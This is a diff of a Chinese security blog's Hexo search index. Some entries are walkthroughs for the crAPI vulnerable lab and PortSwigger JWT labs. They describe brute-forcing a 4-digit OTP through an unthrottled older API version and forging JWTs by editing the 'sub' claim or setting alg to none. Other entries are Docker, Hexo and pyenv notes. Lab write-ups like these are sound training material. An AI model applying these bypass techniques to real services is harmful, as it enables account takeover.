@@ -38,14 +38,11 @@
       </tags>
   </entry>
   <entry>
-    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
-    <url>/posts/432259a6.html</url>
-    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
-<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
-<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
-<p>修改完成后可访问成功</p>
-]]></content>
+    <title>容器服务启动失败</title>
+    <url>/posts/5746187b.html</url>
+    <content><![CDATA[<p>ERROR: for mongodb  Cannot create container for service mongodb: Conflict. The container name “&#x2F;mongodb” is already in use by container “193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d”. You have to remove (or rename) that container to be able to reuse that name.<br>ERROR: Encountered errors while bringing up the project.</p>
+<p>for mongodb无法为服务mongodb创建容器：冲突。容器名称“&#x2F;mongodb”已被容器“193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d”使用。您必须删除（或重命名）该容器才能重用该名称。<br>错误：启动项目时遇到错误。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">显示所有容器</span><br><span class="line">docker rm -f 193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d</span><br><span class="line">删除占用容器 id</span><br><span class="line">docker-compose up -d</span><br><span class="line">重新启动容器</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>报错</category>
       </categories>
@@ -54,11 +51,14 @@
       </tags>
   </entry>
   <entry>
-    <title>容器服务启动失败</title>
-    <url>/posts/5746187b.html</url>
-    <content><![CDATA[<p>ERROR: for mongodb  Cannot create container for service mongodb: Conflict. The container name “&#x2F;mongodb” is already in use by container “193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d”. You have to remove (or rename) that container to be able to reuse that name.<br>ERROR: Encountered errors while bringing up the project.</p>
-<p>for mongodb无法为服务mongodb创建容器：冲突。容器名称“&#x2F;mongodb”已被容器“193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d”使用。您必须删除（或重命名）该容器才能重用该名称。<br>错误：启动项目时遇到错误。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">显示所有容器</span><br><span class="line">docker rm -f 193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d</span><br><span class="line">删除占用容器 id</span><br><span class="line">docker-compose up -d</span><br><span class="line">重新启动容器</span><br></pre></td></tr></table></figure>]]></content>
+    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
+    <url>/posts/432259a6.html</url>
+    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
+<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
+<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
+<p>修改完成后可访问成功</p>
+]]></content>
       <categories>
         <category>报错</category>
       </categories>
@@ -98,7 +98,7 @@
 <p>抓包携带authentication，内部修改id值可显示其他用户报告内容，并泄露机械师email、number用户车辆vin值、number等敏感信息<br><img src="/img/crapi/otherreport.png"></p>
 <h1 id="失效的用户身份验证"><a href="#失效的用户身份验证" class="headerlink" title="失效的用户身份验证"></a>失效的用户身份验证</h1><p>Broken User Authentication<br>API在访问时未对请求方进行身份验证或身份验证存在问题导致易被破解<br>如:<br>未校验令牌的有效性<br>更新密码接口未限制请求频率，旧密码参数可暴力破解<br>短信验证码或者邮箱验证码有效期超出 10 分钟或者长度小于 6 位</p>
 <h2 id="3-重置其他用户的密码"><a href="#3-重置其他用户的密码" class="headerlink" title="3.重置其他用户的密码"></a>3.重置其他用户的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">旧的API版本通常会包含更多的安全漏洞，他们缺乏一些安全机制。我们可以使用REST API的一些特征来预测是否存在旧的API版本。</span><br><span class="line">比如当前有一个API被命名为/api/v3/login ，我们可以检查/api/v1/login是否存在 。</span><br></pre></td></tr></table></figure>
-<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#112;&#111;&#103;&#x62;&#x61;&#x30;&#48;&#54;&#x40;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;">&#112;&#111;&#103;&#x62;&#x61;&#x30;&#48;&#54;&#x40;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
+<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#x70;&#x6f;&#103;&#98;&#x61;&#x30;&#48;&#x36;&#64;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;">&#x70;&#x6f;&#103;&#98;&#x61;&#x30;&#48;&#x36;&#64;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
 <p>发送多次后发现存在爆破次数上限<br><img src="/img/crapi/otpattackerrorbp.png"><br>查看接口发现存在v3，判断是否存在历史版本接口v1或v2(v1经验证不存在，v2未对爆破次数作限制)<br><img src="/img/crapi/otpattacksuccessbp.png"><br>经爆破otp验证码未6216，尝试修改密码后登录成功<br><img src="/img/crapi/loginsuccess.png"></p>
 <h1 id="过度数据暴露"><a href="#过度数据暴露" class="headerlink" title="过度数据暴露"></a>过度数据暴露</h1><p>Excessive Data Exposure<br>过度数据暴露是一种安全漏洞，当您的前端请求的数据超过预期时就会发生这种情况。在 Web 应用程序中，任何人都可以打开浏览器开发人员工具并检查传入和传出的 HTTP 请求。他们可以看到从这些请求中收到的数据负载。<br>因此，即使前端不一定使用或消费这些数据，攻击者仍然可以通过 API 调用查看这些数据。如果 API 发送的数据比前端需要的敏感数据多，攻击者就可以利用这些数据对用户造成损害。<br>这被称为过度数据暴露。在过度数据暴露中，暴露的敏感数据实际上比任何人可以访问的数据都要多。</p>
 <h2 id="4-其他用户敏感信息api接口"><a href="#4-其他用户敏感信息api接口" class="headerlink" title="4.其他用户敏感信息api接口"></a>4.其他用户敏感信息api接口</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br><img src="/img/crapi/bolabp.png"></p>
@@ -210,61 +210,6 @@
       </tags>
   </entry>
   <entry>
-    <title>本站hexo魔改</title>
-    <url>/posts/ab21860c.html</url>
-    <content><![CDATA[<h1 id="自定义文件"><a href="#自定义文件" class="headerlink" title="自定义文件"></a>自定义文件</h1><p>网上大部分魔改是通过修改主题文件，虽然快速直接，但是遇到主题更新会重置，因此博客通过添加自定义css和js文件实现的魔改即使主题更新也会保留。<br>创建的文件位置:<br>博客根目录下的source文件夹(不是themes下的source)创建js和css。<br><img src="/img/modify/touchjscss.png"></p>
-<h2 id="引入文件位置"><a href="#引入文件位置" class="headerlink" title="引入文件位置"></a>引入文件位置</h2><p><a href="https://blog.leonus.cn/2022/custom.html">https://blog.leonus.cn/2022/custom.html</a></p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">  <span class="comment"># 自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/loading.css?1&quot;&gt;</span></span><br><span class="line">      <span class="comment"># 静态文件后加个 ?任意内容 可以在每次更新后用户自动重新请求</span></span><br><span class="line">      <span class="comment"># 例如添加 ?1 ,在修改此文件后改成 ?2 ,用户访问你的网站时,不会使用本地的缓存,而是请求新的内容。没修改的话就不用动。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/transparency.css&quot;&gt;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/social_iconfont.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">  <span class="comment"># 自定义js</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;/js/title_change.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#引入多个文件就直接复制一行更改文件名即可</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/js/文件名&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="加载动画"><a href="#加载动画" class="headerlink" title="加载动画"></a>加载动画</h1><h2 id="loading动画步骤"><a href="#loading动画步骤" class="headerlink" title="loading动画步骤"></a>loading动画步骤</h2><p>满屏与 pace 同时启用<br><a href="https://blog.anheyu.com/posts/52d8.html">https://blog.anheyu.com/posts/52d8.html</a><br>修改加载动画。(script(async)使用异步加载防止加载其他页面时阻塞该脚本的加载;settimeout设置定时器防止过长的动画加载时间)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/layout/includes/loading/fullpage-loading.pug</span><br></pre></td></tr></table></figure>
-<p>根据配置选项theme.preloader.source的值来选择加载动画的不同实现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/layout/includes/loading/index.pug</span><br></pre></td></tr></table></figure>
-<p>定义了一个名为 .pace 的加载动画样式实现页面加载时的进度条效果，若启用此css需将配置文件_config.butterfly.yml的pace_css_url值留空</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/css/progress_bar.css</span><br></pre></td></tr></table></figure>
-<p>定义加载动画样式，其中颜色代码–anzhiyu-card-bg等需自行替换为自己的色值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/source/css/_layout/loading.styl</span><br></pre></td></tr></table></figure>
-<p>新增文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/css/loading.css</span><br></pre></td></tr></table></figure>
-<p>修改主题配置文件_config.butterfly.yml的preloader项</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Loading Animation</span></span><br><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="comment"># 3. all</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">/css/progress_bar.css</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="comment"># 自定义头像</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p><a href="https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/">https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/</a></p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo魔改</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网穿透工具FRP</title>
-    <url>/posts/fe1704c8.html</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Intranet 安全</category>
-      </categories>
-      <tags>
-        <tag>内网穿透工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Portswigger-JWT-LAB-1</title>
-    <url>/posts/962f5710.html</url>
-    <content><![CDATA[<h1 id="未经验证的签名绕过JWT身份验证"><a href="#未经验证的签名绕过JWT身份验证" class="headerlink" title="未经验证的签名绕过JWT身份验证"></a>未经验证的签名绕过JWT身份验证</h1><p>未经验证的签名，即修改载荷发送至服务端不会对算法和签名进行验证从而绕过JWT身份认证</p>
-<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
-<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>靶场页面<br><img src="/img/jwt/jwt1/index.png"><br>登录页面<br><img src="/img/jwt/jwt1/login.png"><br>登录抓包返回jwt令牌数据<br><img src="/img/jwt/jwt1/loginback.png"><br>查看jwt详细数据<br><img src="/img/jwt/jwt1/jwt.png"><br>抓包，访问My account功能点修改接口admin:GET &#x2F;my-account?id&#x3D;wiener为admin:GET &#x2F;admin，出现错误，显示:管理员界面仅在以管理员身份登录时可用<br><img src="/img/jwt/jwt1/adminerror.png"><br>修改sub值为admin或administrator成功<br><img src="/img/jwt/jwt1/adminjwt.png"><br>删除carlos(点击删除还会对jwt令牌认证，再次抓包修改jwt的sub值为administrator即可)<br><img src="/img/jwt/jwt1/delete.png"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>JWT Vulnerabilitiy</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>红日靶场2记录</title>
     <url>/posts/77f95bb5.html</url>
     <content><![CDATA[<h1 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h1><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>为了模拟内网外网两个环境，虚拟网络编辑器配置两张网卡，nat网卡模拟内外网交互，仅主机网卡模拟内网环境。<br>NAT网卡<br>192.168.80.0&#x2F;24<br>仅主机网卡<br>10.10.10.0&#x2F;24</p>
@@ -309,6 +254,61 @@
 ]]></content>
   </entry>
   <entry>
+    <title>内网穿透工具FRP</title>
+    <url>/posts/fe1704c8.html</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Intranet 安全</category>
+      </categories>
+      <tags>
+        <tag>内网穿透工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>本站hexo魔改</title>
+    <url>/posts/ab21860c.html</url>
+    <content><![CDATA[<h1 id="自定义文件"><a href="#自定义文件" class="headerlink" title="自定义文件"></a>自定义文件</h1><p>网上大部分魔改是通过修改主题文件，虽然快速直接，但是遇到主题更新会重置，因此博客通过添加自定义css和js文件实现的魔改即使主题更新也会保留。<br>创建的文件位置:<br>博客根目录下的source文件夹(不是themes下的source)创建js和css。<br><img src="/img/modify/touchjscss.png"></p>
+<h2 id="引入文件位置"><a href="#引入文件位置" class="headerlink" title="引入文件位置"></a>引入文件位置</h2><p><a href="https://blog.leonus.cn/2022/custom.html">https://blog.leonus.cn/2022/custom.html</a></p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">  <span class="comment"># 自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/loading.css?1&quot;&gt;</span></span><br><span class="line">      <span class="comment"># 静态文件后加个 ?任意内容 可以在每次更新后用户自动重新请求</span></span><br><span class="line">      <span class="comment"># 例如添加 ?1 ,在修改此文件后改成 ?2 ,用户访问你的网站时,不会使用本地的缓存,而是请求新的内容。没修改的话就不用动。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/transparency.css&quot;&gt;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/social_iconfont.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">  <span class="comment"># 自定义js</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;/js/title_change.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#引入多个文件就直接复制一行更改文件名即可</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/js/文件名&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="加载动画"><a href="#加载动画" class="headerlink" title="加载动画"></a>加载动画</h1><h2 id="loading动画步骤"><a href="#loading动画步骤" class="headerlink" title="loading动画步骤"></a>loading动画步骤</h2><p>满屏与 pace 同时启用<br><a href="https://blog.anheyu.com/posts/52d8.html">https://blog.anheyu.com/posts/52d8.html</a><br>修改加载动画。(script(async)使用异步加载防止加载其他页面时阻塞该脚本的加载;settimeout设置定时器防止过长的动画加载时间)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/layout/includes/loading/fullpage-loading.pug</span><br></pre></td></tr></table></figure>
+<p>根据配置选项theme.preloader.source的值来选择加载动画的不同实现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/layout/includes/loading/index.pug</span><br></pre></td></tr></table></figure>
+<p>定义了一个名为 .pace 的加载动画样式实现页面加载时的进度条效果，若启用此css需将配置文件_config.butterfly.yml的pace_css_url值留空</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/css/progress_bar.css</span><br></pre></td></tr></table></figure>
+<p>定义加载动画样式，其中颜色代码–anzhiyu-card-bg等需自行替换为自己的色值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/source/css/_layout/loading.styl</span><br></pre></td></tr></table></figure>
+<p>新增文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/css/loading.css</span><br></pre></td></tr></table></figure>
+<p>修改主题配置文件_config.butterfly.yml的preloader项</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Loading Animation</span></span><br><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="comment"># 3. all</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">/css/progress_bar.css</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="comment"># 自定义头像</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p><a href="https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/">https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/</a></p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo魔改</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Portswigger-JWT-LAB-1</title>
+    <url>/posts/962f5710.html</url>
+    <content><![CDATA[<h1 id="未经验证的签名绕过JWT身份验证"><a href="#未经验证的签名绕过JWT身份验证" class="headerlink" title="未经验证的签名绕过JWT身份验证"></a>未经验证的签名绕过JWT身份验证</h1><p>未经验证的签名，即修改载荷发送至服务端不会对算法和签名进行验证从而绕过JWT身份认证</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
+<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>靶场页面<br><img src="/img/jwt/jwt1/index.png"><br>登录页面<br><img src="/img/jwt/jwt1/login.png"><br>登录抓包返回jwt令牌数据<br><img src="/img/jwt/jwt1/loginback.png"><br>查看jwt详细数据<br><img src="/img/jwt/jwt1/jwt.png"><br>抓包，访问My account功能点修改接口admin:GET &#x2F;my-account?id&#x3D;wiener为admin:GET &#x2F;admin，出现错误，显示:管理员界面仅在以管理员身份登录时可用<br><img src="/img/jwt/jwt1/adminerror.png"><br>修改sub值为admin或administrator成功<br><img src="/img/jwt/jwt1/adminjwt.png"><br>删除carlos(点击删除还会对jwt令牌认证，再次抓包修改jwt的sub值为administrator即可)<br><img src="/img/jwt/jwt1/delete.png"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>JWT Vulnerabilitiy</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Portswigger-JWT-LAB-3</title>
     <url>/posts/d0e26b4a.html</url>
     <content><![CDATA[<h1 id="通过弱签名密钥绕过JWT身份验证"><a href="#通过弱签名密钥绕过JWT身份验证" class="headerlink" title="通过弱签名密钥绕过JWT身份验证"></a>通过弱签名密钥绕过JWT身份验证</h1><p>当jwt令牌使用了一个弱的密钥进行签名和验证令牌，可以通过对密钥暴力破解获取加密密钥并对修改过的header和payload进行签名</p>
@@ -326,9 +326,19 @@
       </tags>
   </entry>
   <entry>
-    <title>leichi</title>
-    <url>/posts/ad3631c.html</url>
-    <content><![CDATA[]]></content>
+    <title>Portswigger-JWT-LAB-2</title>
+    <url>/posts/a7e55bdc.html</url>
+    <content><![CDATA[<h1 id="通过有缺陷的签名验证绕过JWT身份验证"><a href="#通过有缺陷的签名验证绕过JWT身份验证" class="headerlink" title="通过有缺陷的签名验证绕过JWT身份验证"></a>通过有缺陷的签名验证绕过JWT身份验证</h1><p>服务器被不安全地配置为接受未签名的JWT，即通过修改alg为none并删除签名即可绕过</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
+<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>思路还是一样，使用jwt令牌修改为admin进入admin界面，但需要对alg值修改为none，并删除签名部分<br><img src="/img/jwt/jwt2/jwt.png"><br>删除用户同理</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>JWT Vulnerabilitiy</tag>
+      </tags>
   </entry>
   <entry>
     <title>内网基础知识记录</title>
@@ -372,6 +382,11 @@
       <tags>
         <tag>内网术语</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>leichi</title>
+    <url>/posts/ad3631c.html</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>mongodb-nosql注入</title>
@@ -558,18 +573,37 @@
       </tags>
   </entry>
   <entry>
-    <title>Portswigger-JWT-LAB-2</title>
-    <url>/posts/a7e55bdc.html</url>
-    <content><![CDATA[<h1 id="通过有缺陷的签名验证绕过JWT身份验证"><a href="#通过有缺陷的签名验证绕过JWT身份验证" class="headerlink" title="通过有缺陷的签名验证绕过JWT身份验证"></a>通过有缺陷的签名验证绕过JWT身份验证</h1><p>服务器被不安全地配置为接受未签名的JWT，即通过修改alg为none并删除签名即可绕过</p>
-<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
-<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>思路还是一样，使用jwt令牌修改为admin进入admin界面，但需要对alg值修改为none，并删除签名部分<br><img src="/img/jwt/jwt2/jwt.png"><br>删除用户同理</p>
+    <title>pyenv 简单使用记录</title>
+    <url>/posts/199c3661.html</url>
+    <content><![CDATA[<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pyenv项目（我是下载pyenv然后解压到root下，plugin插件没有virtualenv-init，后面用git下载）</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ~]$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure>
+<h1 id="bashrc环境配置"><a href="#bashrc环境配置" class="headerlink" title=".bashrc环境配置"></a>.bashrc环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;export PATH=&quot;$HOME/.pyenv/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init --path)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv virtualenv-init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
+<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>更新出错显示没有virtualenv-init</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# source /root/.bashrc</span><br><span class="line">pyenv: no such command `virtualenv-init&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个命令可以将下载的插件直接放入pyenv的plugin插件文件夹下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line">Cloning into &#x27;/root/.pyenv/plugins/pyenv-virtualenv&#x27;...</span><br><span class="line">remote: Enumerating objects: 2301, done.</span><br><span class="line">再次更新成功</span><br></pre></td></tr></table></figure>
+<h1 id="本地缓存加快python包解压缩"><a href="#本地缓存加快python包解压缩" class="headerlink" title="本地缓存加快python包解压缩"></a>本地缓存加快python包解压缩</h1><p>创建cache文件夹缓存下载好的python压缩包</p>
